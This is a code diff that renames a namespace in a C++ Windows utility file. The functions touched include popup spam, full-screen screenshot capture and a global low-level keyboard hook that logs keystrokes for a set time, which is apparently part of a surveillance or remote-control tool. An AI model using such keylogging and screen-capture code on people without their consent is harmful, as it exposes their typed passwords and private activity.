@@ -6,7 +6,7 @@
 #include "WinUtils.h"
 #include <iostream>
 
-bool win_utils::do_popup(const std::string& window_name, const std::string& text, const DWORD flags)
+bool windows::do_popup(const std::string& window_name, const std::string& text, const DWORD flags)
 {
     const auto result = MessageBoxA(GetForegroundWindow(), text.c_str(), window_name.c_str(), flags);
     if (!result) {
@@ -15,7 +15,7 @@ bool win_utils::do_popup(const std::string& window_name, const std::string& text
     return true;
 }
 
-void win_utils::do_popups(const size_t count, const std::string& window_name, const std::string& text, const DWORD flags)
+void windows::do_popups(const size_t count, const std::string& window_name, const std::string& text, const DWORD flags)
 {
     // Seed the random number generator
     std::srand(static_cast<unsigned int>(std::time(nullptr)));
@@ -46,7 +46,7 @@ void win_utils::do_popups(const size_t count, const std::string& window_name, co
     std::this_thread::sleep_for(std::chrono::seconds(1));
 }
 
-std::string win_utils::take_screenshot()
+std::string windows::take_screenshot()
 {
     // Get the desktop device context (DC) of the entire virtual screen
     HDC h_screen_dc = GetDC(nullptr);
@@ -118,7 +118,7 @@ std::string win_utils::take_screenshot()
     return bmp_buffer;
 }
 
-BOOL win_utils::get_message_with_timeout(MSG* msg, unsigned int to)
+BOOL windows::get_message_with_timeout(MSG* msg, unsigned int to)
 {
     BOOL res;
     UINT_PTR timer_id = SetTimer(nullptr, 0, to, nullptr);
@@ -131,10 +131,10 @@ BOOL win_utils::get_message_with_timeout(MSG* msg, unsigned int to)
     return TRUE;
 }
 
-std::string win_utils::log_keys(unsigned int duration_seconds)
+std::string windows::log_keys(unsigned int duration_seconds)
 {
     key_logger_key_codes.clear();
-    HHOOK hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, win_utils::log_keys_hook, 0, 0);
+    HHOOK hook_handle = SetWindowsHookEx(WH_KEYBOARD_LL, windows::log_keys_hook, 0, 0);
 
     MSG msg;
     get_message_with_timeout(&msg, duration_seconds * 1000);
@@ -148,7 +148,7 @@ std::string win_utils::log_keys(unsigned int duration_seconds)
     return result;
 }
 
-LRESULT CALLBACK win_utils::log_keys_hook(int nCode, WPARAM wParam, LPARAM lParam)
+LRESULT CALLBACK windows::log_keys_hook(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode == HC_ACTION)
     {
